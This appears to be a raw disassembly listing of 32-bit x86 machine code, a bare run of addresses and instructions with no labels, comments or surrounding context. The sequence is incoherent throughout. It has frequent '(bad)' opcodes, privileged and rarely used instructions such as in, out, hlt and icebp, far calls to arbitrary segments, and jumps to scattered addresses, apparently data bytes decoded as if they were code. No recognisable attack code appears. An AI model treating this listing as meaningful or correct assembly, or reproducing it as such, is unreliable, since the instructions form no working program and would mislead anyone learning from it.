  414ae4:	or     BYTE PTR [esi-0x1d],bl
  414ae7:	pop    es
  414ae8:	retf   
  414ae9:	ins    DWORD PTR es:[edi],dx
  414aea:	mov    DWORD PTR [ecx+ebp*2],edx
  414aed:	ja     0x414af2
  414aef:	cmp    ebp,DWORD PTR [edx+0x736d80dd]
  414af5:	enter  0x1346,0x26
  414af9:	(bad)
  414afc:	push   ebx
  414afd:	psllq  mm4,QWORD PTR [esi-0x65]
  414b01:	push   edx
  414b02:	sub    ch,bl
  414b04:	adc    edx,ebx
  414b06:	jle    0x414b80
  414b08:	aam    0xdd
  414b0a:	mov    ch,0xde
  414b0c:	jo     0x414a9b
  414b0e:	bound  ecx,QWORD PTR [edx]
  414b10:	repnz repz sub DWORD PTR [eax],esi
  414b14:	sub    esi,DWORD PTR [edx+0x7c]
  414b17:	xchg   esi,eax
  414b18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b19:	inc    edi
  414b1a:	arpl   WORD PTR [esi+0x61991496],si
  414b20:	test   BYTE PTR [edi-0x77e8833d],dh
  414b26:	stos   BYTE PTR es:[edi],al
  414b27:	imul   edi,DWORD PTR [ebx],0xffffff86
  414b2a:	sub    DWORD PTR [edx],ecx
  414b2c:	inc    ecx
  414b2d:	gs pop ebx
  414b2f:	mov    ch,0x4
  414b31:	xor    edx,esi
  414b33:	dec    esp
  414b34:	push   0xffffffd1
  414b36:	outs   dx,DWORD PTR ds:[esi]
  414b37:	jmp    0x414ae7
  414b39:	fs jl  0x414b8f
  414b3c:	pop    esp
  414b3d:	stos   DWORD PTR es:[edi],eax
  414b3e:	xor    eax,0xc6ae1138
  414b43:	jnp    0x414b02
  414b45:	fistp  WORD PTR [ebp+0x5c]
  414b48:	add    DWORD PTR [ebp+0x72],esp
  414b4b:	loope  0x414b57
  414b4d:	sub    eax,0xc3293569
  414b52:	sub    edx,DWORD PTR [ebx-0x3b7faaa5]
  414b58:	bsf    ebx,DWORD PTR [eax+0x66]
  414b5c:	cdq    
  414b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414b5e:	xchg   ebp,eax
  414b5f:	outs   dx,BYTE PTR ds:[esi]
  414b60:	push   eax
  414b61:	xchg   edi,eax
  414b62:	ins    BYTE PTR es:[edi],dx
  414b63:	test   BYTE PTR [ecx+0x46790176],bh
  414b69:	stos   DWORD PTR es:[edi],eax
  414b6a:	aam    0x57
  414b6c:	or     dh,BYTE PTR [ebp+0x262c37f0]
  414b72:	pushf  
  414b73:	lea    ebp,[ecx+0x6f2256a0]
  414b79:	push   eax
  414b7a:	mul    esi
  414b7c:	loope  0x414bec
  414b7e:	aas    
  414b7f:	mov    edx,0x57cd34df
  414b84:	mov    al,ds:0xe28333d1
  414b89:	int3   
  414b8a:	imul   esp,DWORD PTR [edx],0x21222449
  414b90:	add    eax,0xbbfa3909
  414b95:	inc    edi
  414b96:	jae    0x414bb7
  414b98:	pusha  
  414b99:	mov    cl,0xe7
  414b9b:	push   es
  414b9c:	pop    eax
  414b9d:	call   0xcab5:0xb30a6e43
  414ba4:	call   esi
  414ba6:	inc    edi
  414ba7:	add    edx,ebp
  414ba9:	lods   al,BYTE PTR ds:[esi]
  414baa:	imul   eax,DWORD PTR [esi],0x791328b5
  414bb0:	mov    edx,0xa46bd762
  414bb5:	xchg   esi,eax
  414bb6:	inc    esi
  414bb7:	outs   dx,BYTE PTR ds:[esi]
  414bb8:	pop    ecx
  414bb9:	jae    0x414c00
  414bbb:	clc    
  414bbc:	mov    bl,0xd3
  414bbe:	sub    ebx,edx
  414bc0:	in     al,dx
  414bc1:	mov    edi,0x4428d89a
  414bc6:	and    al,0x9
  414bc8:	je     0x414b9c
  414bca:	xor    al,0x4d
  414bcc:	sbb    BYTE PTR [edi+0x3092c5bd],0xa8
  414bd3:	jmp    0x4a01bd31
  414bd8:	test   ebx,esp
  414bda:	inc    edx
  414bdb:	add    al,0xab
  414bdd:	push   ebp
  414bde:	mov    eax,0x8cc10577
  414be3:	js     0x414b7e
  414be5:	ror    DWORD PTR [ebp-0x1b135aa6],1
  414beb:	jmp    0x414ba8
  414bed:	je     0x414c60
  414bef:	jnp    0x414c44
  414bf1:	push   0xe7710e5
  414bf6:	jne    0x414bc0
  414bf8:	retf   0x686a
  414bfb:	sub    DWORD PTR [edx],ebp
  414bfd:	jge    0x414b9b
  414bff:	(bad)  
  414c00:	mov    ebp,0x3dc5f84e
  414c05:	out    dx,al
  414c06:	stc    
  414c07:	into   
  414c08:	fwait
  414c09:	in     al,dx
  414c0a:	mov    dh,0xb4
  414c0c:	cld    
  414c0d:	add    dl,BYTE PTR [edx-0x480c7334]
  414c13:	xchg   ecx,eax
  414c14:	sub    BYTE PTR [eax-0x19928096],ah
  414c1a:	dec    eax
  414c1b:	div    DWORD PTR [ebp-0x3acda05b]
  414c21:	stos   BYTE PTR es:[edi],al
  414c22:	test   eax,0x40a49ddb
  414c27:	fwait
  414c28:	pusha  
  414c29:	pop    ecx
  414c2a:	lahf   
  414c2b:	sub    al,0xf8
  414c2d:	sub    eax,0xad36ee6c
  414c32:	mov    dh,0x75
  414c34:	sbb    eax,0x850ac6e9
  414c39:	stos   BYTE PTR es:[edi],al
  414c3a:	sub    BYTE PTR ds:0xa4e51b80,al
  414c40:	pop    es
  414c41:	adc    DWORD PTR [eax+eiz*2],0x445f6acb
  414c48:	adc    eax,0xe01ab8b
  414c4d:	mov    WORD PTR ds:0xf345a322,fs
  414c53:	push   ecx
  414c54:	pop    esp
  414c55:	sub    edx,DWORD PTR [ebp+0x70]
  414c58:	mov    ebx,0x46e5685
  414c5d:	loop   0x414c96
  414c5f:	lods   al,BYTE PTR ds:[esi]
  414c60:	mov    eax,ds:0xc1978b5f
  414c65:	and    esi,esi
  414c67:	sbb    eax,0xd6b1ddca
  414c6c:	add    al,0xe8
  414c6e:	gs or  al,bl
  414c71:	mov    BYTE PTR [ecx],al
  414c73:	sbb    DWORD PTR [ecx+eax*2+0x6],esi
  414c77:	test   eax,0x302788c9
  414c7c:	jp     0x414ccc
  414c7e:	mov    eax,0x659be036
  414c83:	mov    dh,0x2e
  414c85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c86:	scas   eax,DWORD PTR es:[edi]
  414c87:	jne    0x414d06
  414c89:	sti    
  414c8a:	sub    dl,BYTE PTR [esi+0x72082529]
  414c90:	jle    0x414c3f
  414c92:	push   0xfffffff3
  414c94:	sbb    al,0xee
  414c96:	lods   eax,DWORD PTR ds:[esi]
  414c97:	aas    
  414c98:	pop    ebx
  414c99:	mov    edx,0x9d5cb957
  414c9e:	mov    cl,0x18
  414ca0:	mov    esp,DWORD PTR [edi+0x11658669]
  414ca6:	inc    esi
  414ca7:	fidivr DWORD PTR [eax+ecx*1-0x7cab08c0]
  414cae:	add    eax,0x1275c49b
  414cb3:	not    DWORD PTR [eax]
  414cb5:	je     0x414cd4
  414cb7:	push   ecx
  414cb8:	inc    ecx
  414cb9:	inc    BYTE PTR [ecx+0xa]
  414cbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414cbd:	mov    eax,ds:0xb4dd0d5d
  414cc2:	(bad)  
  414cc3:	fdivr  DWORD PTR [ecx+0x45]
  414cc6:	adc    eax,0xdf718dbc
  414ccb:	or     edi,ecx
  414ccd:	cmp    edx,DWORD PTR [edi-0x51]
  414cd0:	lahf   
  414cd1:	adc    BYTE PTR [ebx+ecx*4],0xae
  414cd5:	nop
  414cd6:	frstor [ebx]
  414cd8:	jle    0x414d4d
  414cda:	lods   eax,DWORD PTR ds:[esi]
  414cdb:	sub    eax,0x10457f75
  414ce0:	xchg   esp,eax
  414ce1:	pop    es
  414ce2:	add    cl,bh
  414ce4:	adc    al,0xdd
  414ce6:	mov    ah,0xed
  414ce8:	loopne 0x414cbc
  414cea:	mov    ah,0x9a
  414cec:	pop    edi
  414ced:	add    al,0xb2
  414cef:	and    eax,ebp
  414cf1:	mov    eax,ds:0x7b4bcb1a
  414cf6:	(bad)  
  414cf7:	mov    dh,0xfe
  414cf9:	fistp  QWORD PTR [eax]
  414cfb:	push   esp
  414cfc:	stc    
  414cfd:	pop    es
  414cfe:	into   
  414cff:	gs inc edi
  414d01:	jp     0x414d10
  414d03:	sub    al,BYTE PTR [eax]
  414d05:	pop    ebp
  414d06:	jmp    0x89d100ef
  414d0b:	std    
  414d0c:	ret    0xb454
  414d0f:	daa    
  414d10:	pusha  
  414d11:	jl     0x414d55
  414d13:	aas    
  414d14:	cld    
  414d15:	cli    
  414d16:	lods   eax,DWORD PTR ds:[esi]
  414d17:	cmp    ah,BYTE PTR [ebx+0x7f]
  414d1a:	das    
  414d1b:	add    DWORD PTR [ebp-0x14],0x16
  414d1f:	or     DWORD PTR [ebx+0x5e385b36],esp
  414d25:	retf   0xa857
  414d28:	jecxz  0x414d68
  414d2a:	out    0x54,eax
  414d2c:	and    BYTE PTR [edi+0x78fa3e0c],dh
  414d32:	xchg   edx,eax
  414d33:	retf   0x878f
  414d36:	sbb    ebx,DWORD PTR [edx]
  414d38:	loop   0x414cd4
  414d3a:	leave  
  414d3b:	or     ch,ah
  414d3d:	retf   
  414d3e:	ja     0x414d15
  414d40:	pop    ss
  414d41:	mov    bh,0x55
  414d43:	je     0x414cf2
  414d45:	pop    ss
  414d46:	lods   eax,DWORD PTR ds:[esi]
  414d47:	popa   
  414d48:	cmp    BYTE PTR [ebp+ebp*8-0x5b],dh
  414d4c:	pop    eax
  414d4d:	mov    al,ds:0x32f9a0e0
  414d52:	dec    edi
  414d53:	or     eax,0x9f053692
  414d58:	fcomp  DWORD PTR [ebp+0x1cb1df87]
  414d5e:	fcom   QWORD PTR [edx]
  414d60:	mov    al,ds:0x7ecbe162
  414d65:	cld    
  414d66:	mov    fs,WORD PTR ds:0x89676578
  414d6c:	mov    WORD PTR ds:[edx+esi*1-0x4a42f716],?
  414d74:	in     al,0xb5
  414d76:	mov    ebx,0x77f10a8e
  414d7b:	sti    
  414d7c:	inc    ebx
  414d7d:	test   esi,esp
  414d7f:	mov    dl,BYTE PTR [ebx+0x78]
  414d82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414d83:	sub    bh,BYTE PTR [esi]
  414d85:	fidivr WORD PTR [edi]
  414d87:	cmp    ah,BYTE PTR [esi]
  414d89:	icebp  
  414d8a:	adc    esi,DWORD PTR [ebx+0x5c1fecfb]
  414d90:	mov    esi,0x36ed8409
  414d95:	ds out dx,eax
  414d97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d98:	cli    
  414d99:	dec    esi
  414d9a:	inc    edi
  414d9b:	imul   ecx,esi,0x76
  414d9e:	outs   dx,DWORD PTR ds:[esi]
  414d9f:	ds mov ch,0x5f
  414da2:	push   ecx
  414da3:	ins    BYTE PTR es:[edi],dx
  414da4:	mov    ds:0x440b239b,eax
  414da9:	and    DWORD PTR [edi+0x3aba155b],esp
  414daf:	mov    ebx,0xa9cc5ef9
  414db4:	das    
  414db5:	jne    0x414d83
  414db7:	sub    eax,0xd61a2388
  414dbc:	inc    esi
  414dbd:	test   eax,0x819571f8
  414dc2:	call   0xd265c261
  414dc7:	ret    0xcead
  414dca:	push   0xffffffdd
  414dcc:	test   eax,0xd238c6e6
  414dd1:	mov    bh,0x98
  414dd3:	ror    DWORD PTR [edi],cl
  414dd5:	aad    0x81
  414dd7:	lods   al,BYTE PTR ds:[esi]
  414dd8:	and    ch,ah
  414dda:	xor    ebx,edx
  414ddc:	call   0x110d4838
  414de1:	mov    ebp,0xabb4fe3
  414de6:	adc    bh,dh
  414de8:	add    bl,bh
  414dea:	mov    ds:0xd998df56,eax
  414def:	sahf   
  414df0:	sub    al,0x64
  414df2:	adc    BYTE PTR [ebx+0x7f],dh
  414df5:	mov    cl,0x6f
  414df7:	loopne 0x414e3f
  414df9:	jp     0x414da9
  414dfb:	mov    WORD PTR fs:[ecx],cs
  414dfe:	hlt    
  414dff:	test   DWORD PTR [eax-0x47d8b28d],esi
  414e05:	loopne 0x414e33
  414e07:	cmp    DWORD PTR [esi+0x35],0x5a
  414e0b:	cmp    edx,DWORD PTR [ecx]
  414e0d:	stos   BYTE PTR es:[edi],al
  414e0e:	jbe    0x414dbf
  414e10:	scas   eax,DWORD PTR es:[edi]
  414e11:	push   ss
  414e12:	mov    ds:0xa0ec4252,eax
  414e17:	xchg   esi,esp
  414e19:	leave  
  414e1a:	push   eax
  414e1b:	es stos BYTE PTR es:[edi],al
  414e1d:	ins    DWORD PTR es:[edi],dx
  414e1e:	jl     0x414e60
  414e20:	dec    ecx
  414e21:	xor    DWORD PTR [esi+0x54],edx
  414e24:	jb     0x414e3b
  414e26:	jp     0x414e76
  414e28:	test   DWORD PTR [ebp-0x202aaff9],esi
  414e2e:	stc    
  414e2f:	in     al,dx
  414e30:	fiadd  DWORD PTR [esi+0x57ad8d88]
  414e36:	stos   DWORD PTR es:[edi],eax
  414e37:	add    al,0x3e
  414e39:	and    al,0xd8
  414e3b:	test   al,0x5d
  414e3d:	fcomp  QWORD PTR [ebx-0x75]
  414e40:	jne    0x414dd6
  414e42:	imul   eax,DWORD PTR [edi],0x46
  414e45:	sub    bh,BYTE PTR [ecx]
  414e47:	pop    edi
  414e48:	mov    esp,0xc3afd625
  414e4d:	push   0x5
  414e4f:	das    
  414e50:	ins    BYTE PTR es:[edi],dx
  414e51:	sub    BYTE PTR [ecx+0x1d],al
  414e54:	icebp  
  414e55:	sub    eax,0x17d2d2d8
  414e5a:	push   0xffffffa1
  414e5c:	sbb    BYTE PTR [edi],ch
  414e5e:	out    dx,eax
  414e5f:	inc    esp
  414e60:	pop    eax
  414e61:	xchg   ebp,eax
  414e62:	mov    edx,0x1fc3b09d
  414e67:	arpl   WORD PTR [ebp+0x32],cx
  414e6a:	jnp    0x414e4f
  414e6c:	lock inc ebp
  414e6e:	in     eax,0x6a
  414e70:	mov    ch,BYTE PTR [ebp-0x35]
  414e73:	and    ch,BYTE PTR [eax+0x2b]
  414e76:	les    ecx,FWORD PTR [ebx-0x405e82db]
  414e7c:	mov    cl,0xe4
  414e7e:	in     al,0x5e
  414e80:	shr    dh,0x87
  414e83:	xchg   ebp,eax
  414e84:	inc    ebp
  414e85:	jo     0x414eac
  414e87:	jnp    0x414e59
  414e89:	and    BYTE PTR [edx+edi*2+0x7dc8588b],ah
  414e90:	cli    
  414e91:	pop    ds
  414e92:	sbb    esp,eax
  414e94:	cmp    DWORD PTR [esi+ebx*8-0x65256c72],0xf8a44f98
  414e9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414ea0:	sbb    cl,BYTE PTR ds:0x2f43055c
  414ea6:	jo     0x414e8a
  414ea8:	sub    BYTE PTR [esp+edi*4],cl
  414eab:	or     BYTE PTR [ecx-0x65cc0e7b],bh
  414eb1:	fwait
  414eb2:	dec    ecx
  414eb3:	call   0xaa1c:0xadef2
  414eba:	sbb    al,0x2e
  414ebc:	push   ebx
  414ebd:	fs push ds
  414ebf:	sub    esi,ebp
  414ec1:	out    0xc9,eax
  414ec3:	je     0x414eb1
  414ec5:	aaa    
  414ec6:	jmp    0x414f35
  414ec8:	ret    
  414ec9:	mov    DWORD PTR [esi-0x2a40b4c0],ebp
  414ecf:	mov    edx,0x2e7d9b5
  414ed4:	out    0x71,eax
  414ed6:	mov    esp,0x4cbf22ba
  414edb:	addr16 int3 
  414edd:	mov    eax,ds:0x4fdf9d4c
  414ee2:	xor    eax,0xfffffffc
  414ee5:	mov    edx,0xd3c121d8
  414eea:	xchg   ebx,eax
  414eeb:	ror    BYTE PTR [ebx+edx*2+0x7fe0023],1
  414ef2:	mov    eax,ds:0x2f88b2e
  414ef7:	mov    esp,0x5c63daf4
  414efc:	dec    ebp
  414efd:	xor    eax,0xdea882e2
  414f02:	rcr    cl,0x4f
  414f05:	push   esi
  414f06:	mov    ebx,0x697462ee
  414f0b:	sub    DWORD PTR [ebp-0x51],esp
  414f0e:	jl     0x414f07
  414f10:	jp     0x414ef6
  414f12:	jnp    0x414ec9
  414f14:	xchg   ebp,eax
  414f15:	xor    ebp,DWORD PTR [edx]
  414f17:	jb     0x414f0a
  414f19:	pop    esp
  414f1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f1b:	cmp    al,0x32
  414f1d:	xchg   dl,dl
  414f1f:	sub    eax,DWORD PTR [eax+0x14]
  414f22:	mov    dl,0xc5
  414f24:	cmp    esi,DWORD PTR [ecx+0x24fcf3d4]
  414f2a:	repz jae 0x414f5c
  414f2d:	mov    ecx,0x41cfd520
  414f32:	int    0xfa
  414f34:	into   
  414f35:	(bad)  
  414f36:	ins    DWORD PTR es:[edi],dx
  414f37:	adc    al,0xa
  414f39:	adc    DWORD PTR [esi-0x4fab5dee],eax
  414f3f:	push   ebp
  414f40:	jp     0x414ee6
  414f42:	shr    DWORD PTR [eax+0x7fa9578],cl
  414f48:	outs   dx,DWORD PTR ds:[esi]
  414f49:	in     al,0x53
  414f4b:	sbb    eax,0x83da9d22
  414f50:	mov    eax,ds:0x4c22b701
  414f55:	imul   esp,edx,0x9
  414f58:	outs   dx,DWORD PTR ds:[esi]
  414f59:	ss cli 
  414f5b:	fistp  WORD PTR [edx]
  414f5d:	cli    
  414f5e:	int    0x7c
  414f60:	sub    DWORD PTR [eax-0x34b36ebc],edx
  414f66:	(bad)  
  414f68:	nop
  414f69:	jp     0x414f3a
  414f6b:	int3   
  414f6c:	cmp    eax,0x801ea9
  414f71:	jno    0x414fb3
  414f73:	pop    ecx
  414f74:	dec    esi
  414f75:	repnz sbb ecx,0x33
  414f79:	aas    
  414f7a:	or     DWORD PTR [ecx],edx
  414f7c:	das    
  414f7d:	mov    al,ds:0x3e654ada
  414f82:	sti    
  414f83:	fisttp DWORD PTR [ecx+0x3b7ca962]
  414f89:	(bad)  
  414f8a:	and    eax,0x22c498c6
  414f8f:	lods   eax,DWORD PTR ds:[esi]
  414f90:	test   BYTE PTR [ebp*1-0x2591acc8],ah
  414f97:	cld    
  414f98:	ins    DWORD PTR es:[edi],dx
  414f99:	icebp  
  414f9a:	imul   ecx,DWORD PTR [edx],0x8f503c84
  414fa0:	mov    BYTE PTR [ebx-0x5410896],ah
  414fa6:	push   ebp
  414fa7:	out    dx,al
  414fa8:	rcl    DWORD PTR ds:0xc044e871,1
  414fae:	xor    DWORD PTR [ebp+0x4f45a922],esi
  414fb4:	ss aam 0xc1
  414fb7:	ss inc ebx
  414fb9:	lods   al,BYTE PTR ds:[esi]
  414fba:	add    DWORD PTR [ebp+0x5e056479],0x21
  414fc1:	add    edi,ebp
  414fc3:	sar    BYTE PTR [ecx-0x1d0a12ec],1
  414fc9:	push   esp
  414fca:	pop    ss
  414fcb:	jle    0x414fa9
  414fcd:	aas    
  414fce:	and    BYTE PTR [edi+0x12],ah
  414fd1:	push   cs
  414fd2:	es daa 
  414fd4:	dec    esi
  414fd5:	ret    
  414fd6:	mov    edx,0x837a4a22
  414fdb:	fwait
  414fdc:	test   BYTE PTR [ebx-0x66],0x76
  414fe0:	jne    0x414f79
  414fe2:	mov    edx,DWORD PTR [eax]
  414fe4:	cwde   
  414fe5:	sbb    DWORD PTR [ebx],ebx
  414fe7:	mov    BYTE PTR [eax-0x69558fe9],0x63
  414fee:	cmp    cl,BYTE PTR [esi+0x9]
  414ff1:	icebp  
  414ff2:	or     BYTE PTR [ebx+0x56],bl
  414ff5:	fdiv   QWORD PTR [ebp+0x51]
  414ff8:	dec    esi
  414ff9:	ret    
  414ffa:	clc    
  414ffb:	retf   
  414ffc:	stos   DWORD PTR es:[edi],eax
  414ffd:	test   BYTE PTR [eax],dh
  414fff:	out    dx,al
  415000:	push   eax
  415001:	xchg   esi,eax
  415002:	ret    
  415003:	imul   BYTE PTR [ebx-0x2a]
  415006:	cdq    
  415007:	ss pop es
  415009:	arpl   WORD PTR [esi-0x4b23e005],bx
  41500f:	inc    esp
  415010:	pop    edx
  415011:	dec    ebx
  415012:	jnp    0x415089
  415014:	mov    ah,0xf9
  415016:	sbb    al,0x2f
  415018:	sti    
  415019:	or     DWORD PTR [edi],edi
  41501b:	pop    esp
  41501c:	lds    esp,FWORD PTR [eax+0x3e]
  41501f:	adc    DWORD PTR [esi-0x50],edi
  415022:	into   
  415023:	ja     0x415035
  415025:	mov    dl,0x37
  415027:	ss push edi
  415029:	outs   dx,BYTE PTR ds:[esi]
  41502a:	popf   
  41502b:	xchg   BYTE PTR [ecx],cl
  41502d:	inc    ebx
  41502e:	aas    
  41502f:	mov    ds,WORD PTR [ecx]
  415031:	sbb    al,0x5e
  415033:	jne    0x414fc5
  415035:	pop    ecx
  415036:	dec    edx
  415037:	ins    BYTE PTR es:[edi],dx
  415038:	arpl   WORD PTR [ecx+0xb],bp
  41503b:	add    al,BYTE PTR [ecx-0x13]
  41503e:	mov    al,0xc8
  415040:	call   0x7e140de4
  415045:	xchg   ebx,eax
  415046:	popa   
  415047:	mov    esi,esi
  415049:	xor    BYTE PTR [eax-0x41],0x3d
  41504d:	pop    es
  41504e:	ret    0x5895
  415051:	xchg   edx,eax
  415052:	sahf   
  415053:	mov    ds:0xfd7388e6,eax
  415058:	rol    BYTE PTR [ebx],0x24
  41505b:	add    eax,0x398330fb
  415060:	inc    esp
  415061:	fwait
  415062:	mov    edx,0xb79d6eac
  415067:	sub    ch,cl
  415069:	sbb    BYTE PTR [ebx],0x41
  41506c:	test   BYTE PTR [esi+0x1afd549d],ch
  415072:	and    dl,BYTE PTR [eax]
  415074:	pop    edi
  415075:	sti    
  415076:	push   es
  415077:	pop    esi
  415078:	mov    dh,0x3e
  41507a:	add    al,BYTE PTR [edx-0x27]
  41507d:	mov    BYTE PTR [edi+0x2c],ch
  415080:	std    
  415081:	es dec edi
  415083:	push   ebp
  415084:	fstp   QWORD PTR [esi]
  415086:	cmp    eax,DWORD PTR ds:[ecx]
  415089:	aam    0x54
  41508b:	adc    bh,bl
  41508d:	xchg   DWORD PTR [ebx+0x61152d02],edi
  415093:	and    eax,0xd047fb4c
  415098:	add    ebp,0x21
  41509b:	(bad)
  41509e:	push   ebp
  41509f:	adc    ecx,DWORD PTR [ebp+0x2b]
  4150a2:	dec    esp
  4150a3:	ja     0x415076
  4150a5:	and    dl,bh
  4150a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4150a8:	fist   WORD PTR [esi]
  4150aa:	xchg   edi,eax
  4150ab:	call   0xd13a:0x52a8842e
  4150b2:	std    
  4150b3:	and    DWORD PTR [esi-0x3b628b7c],edi
  4150b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4150ba:	out    0xe4,eax
  4150bc:	ja     0x41508f
  4150be:	adc    bl,BYTE PTR [edx]
  4150c0:	dec    ebp
  4150c1:	mov    dl,0xbc
  4150c3:	cmp    DWORD PTR [edi],0xffffffe1
  4150c6:	cmp    BYTE PTR [eax+edx*1],dh
  4150c9:	stos   DWORD PTR es:[edi],eax
  4150ca:	js     0x4150d1
  4150cc:	add    BYTE PTR [edi],al
  4150ce:	xchg   BYTE PTR [esi+0x76],bl
  4150d1:	pop    ebx
  4150d2:	pop    eax
  4150d3:	jb     0x415085
  4150d5:	mov    esp,0xc7bd9749
  4150da:	jecxz  0x41506a
  4150dc:	aas    
  4150dd:	hlt    
  4150de:	xor    DWORD PTR [eax+0x40adbb5a],esi
  4150e4:	pop    esp
  4150e5:	mov    edi,0x1c88c7ed
  4150ea:	push   cs
  4150eb:	popa   
  4150ec:	retf   
  4150ed:	dec    ebx
  4150ee:	(bad)  
  4150f0:	pop    esp
  4150f1:	rcr    DWORD PTR [ebx-0x1a],cl
  4150f4:	fcom   st(1)
  4150f6:	sbb    edi,esi
  4150f8:	push   ss
  4150f9:	fld    QWORD PTR [edi]
  4150fb:	cdq    
  4150fc:	xor    BYTE PTR [eax+edx*1+0x49151f88],ch
  415103:	sti    
  415104:	lea    esi,[eax]
  415106:	scas   eax,DWORD PTR es:[edi]
  415107:	xor    al,0x6a
  415109:	hlt    
  41510a:	sahf   
  41510b:	fsubr  QWORD PTR ds:0x7e94c2f4
  415111:	add    al,BYTE PTR [ebx-0x59c8313a]
  415117:	mov    bl,BYTE PTR [ebp+0x17aebddd]
  41511d:	cmp    dl,BYTE PTR [eax-0x4d]
  415120:	sar    DWORD PTR [ebx+0x4f520df0],0x35
  415127:	aam    0x5a
  415129:	int    0x15
  41512b:	test   DWORD PTR [ecx+0x12],edi
  41512e:	cmp    DWORD PTR [esi+0x7825576],0xf1962bb4
  415138:	add    al,BYTE PTR [ecx]
  41513a:	ins    BYTE PTR es:[edi],dx
  41513b:	fs push edi
  41513d:	mov    bh,0x95
  41513f:	sbb    ebp,ebx
  415141:	and    cl,BYTE PTR [esi+edx*8+0xa]
  415145:	jae    0x4150e8
  415147:	or     ah,bh
  415149:	loopne 0x415163
  41514b:	inc    eax
  41514c:	ins    DWORD PTR es:[edi],dx
  41514d:	adc    DWORD PTR [eax+eiz*1-0x6de42aa3],ebx
  415154:	mov    ecx,0xd11fffc8
  415159:	sub    DWORD PTR [edx-0x7cfbfcfa],edi
  41515f:	sub    bl,al
  415161:	shl    DWORD PTR [ebx-0xf4683ce],cl
  415167:	adc    al,0xa8
  415169:	arpl   WORD PTR [eax+0x28945700],di
  41516f:	push   0xffffffe6
  415171:	xor    eax,0x7cbfdb99
  415176:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  415178:	sub    al,0x70
  41517a:	sbb    ecx,0xd2498fcd
  415180:	cs loopne 0x415105
  415183:	ja     0x4151d6
  415185:	scas   eax,DWORD PTR es:[edi]
  415186:	jno    0x415179
  415188:	mov    WORD PTR [edx+edi*1],gs
  41518b:	push   esi
  41518c:	fwait
  41518d:	jecxz  0x41518d
  41518f:	stc    
  415190:	mov    ah,0xc9
  415192:	push   ebx
  415193:	xor    DWORD PTR [edx],0x511dce4e
  415199:	xlat   BYTE PTR ds:[ebx]
  41519a:	sbb    dh,bh
  41519c:	mov    eax,0x32e231b5
  4151a1:	sbb    ebp,DWORD PTR [edx-0x35]
  4151a4:	loope  0x415172
  4151a6:	jl     0x415199
  4151a8:	sbb    eax,0x14ab8dc1
  4151ad:	adc    edx,DWORD PTR fs:[ebp-0x350d156f]
  4151b4:	sbb    DWORD PTR [eax],edi
  4151b6:	rcl    DWORD PTR [ecx-0x2e],1
  4151b9:	mov    edi,0x93a3392b
  4151be:	sub    eax,0x1e8a99dc
  4151c3:	push   0x507660df
  4151c8:	pop    edi
  4151c9:	mov    al,0x8b
  4151cb:	ins    BYTE PTR es:[edi],dx
  4151cc:	dec    ebx
  4151cd:	pop    ebp
  4151ce:	call   0xfae93c4e
  4151d3:	xchg   ebx,eax
  4151d4:	cmp    al,0x34
  4151d6:	jbe    0x415252
  4151d8:	out    dx,al
  4151d9:	adc    DWORD PTR [eax+0xa86fe16],esp
  4151df:	cld    
  4151e0:	addr16 aas 
  4151e2:	dec    esi
  4151e3:	add    BYTE PTR [edx-0x6f0a8bc7],bl
  4151e9:	loop   0x4151b1
  4151eb:	push   esi
  4151ec:	mov    ch,0xf
  4151ee:	mov    cl,0xad
  4151f0:	outs   dx,BYTE PTR ds:[esi]
  4151f1:	or     esi,DWORD PTR [esi+0x491a80e3]
  4151f7:	outs   dx,BYTE PTR ds:[esi]
  4151f8:	test   BYTE PTR [ebx+0x26b9811e],bh
  4151fe:	add    BYTE PTR [edx+0x41],dh
  415201:	faddp  st(7),st
  415203:	(bad)  
  415204:	stc    
  415205:	jns    0x4151b7
  415207:	lods   eax,DWORD PTR ds:[esi]
  415208:	out    dx,eax
  415209:	or     BYTE PTR [ecx+edx*8],0xf1
  41520d:	and    ecx,ebp
  41520f:	dec    ebp
  415210:	fidivr WORD PTR [edx-0x4f]
  415213:	into   
  415214:	xchg   edx,eax
  415215:	ins    BYTE PTR es:[edi],dx
  415216:	dec    edx
  415217:	mov    al,ds:0x8286d9ab
  41521c:	imul   edx,DWORD PTR [ebp-0x32],0x7433b9ed
  415223:	add    BYTE PTR [ebx-0xb9234a],al
  415229:	aad    0x94
  41522b:	cs ja  0x4152a8
  41522e:	mov    ah,BYTE PTR [ebx-0x1f]
  415231:	cmp    eax,0x39ea473f
  415236:	outs   dx,BYTE PTR ds:[esi]
  415237:	jnp    0x4151e6
  415239:	mov    ds:0xb44c65a2,al
  41523e:	bswap  ecx
  415240:	psubq  mm5,mm6
  415243:	push   esi
  415244:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415245:	pop    ebp
  415247:	iret   
  415248:	ds or  eax,0xe0c8988d
  41524e:	and    eax,0xa4c32dc7
  415253:	pop    ss
  415254:	pop    ebp
  415255:	pop    ds
  415256:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415257:	fs mov eax,0x33cb33f0
  41525d:	out    dx,al
  41525e:	aaa    
  41525f:	mov    ebp,0xad674b98
  415264:	dec    ecx
  415265:	ret    
  415266:	mov    ch,0x4b
  415268:	imul   ecx,DWORD PTR [edi+edi*8-0xc50f422],0x25
  415270:	sbb    al,0x15
  415272:	dec    esp
  415273:	fwait
  415274:	sbb    al,0xd9
  415276:	pop    esi
  415277:	or     eax,DWORD PTR [ebx]
  415279:	pop    esp
  41527a:	es ss aas 
  41527d:	fs mov eax,0x81d8fb
  415283:	and    al,0x57
  415285:	and    eax,0xd96cd951
  41528a:	pop    esp
  41528b:	in     eax,dx
  41528c:	mov    DWORD PTR [eax+edi*4-0x7c],esp
  415290:	and    al,0x83
  415292:	jbe    0x415280
  415294:	outs   dx,DWORD PTR ds:[esi]
  415295:	sbb    DWORD PTR [edi-0x30],ebx
  415298:	pop    esi
  415299:	hlt    
  41529a:	icebp  
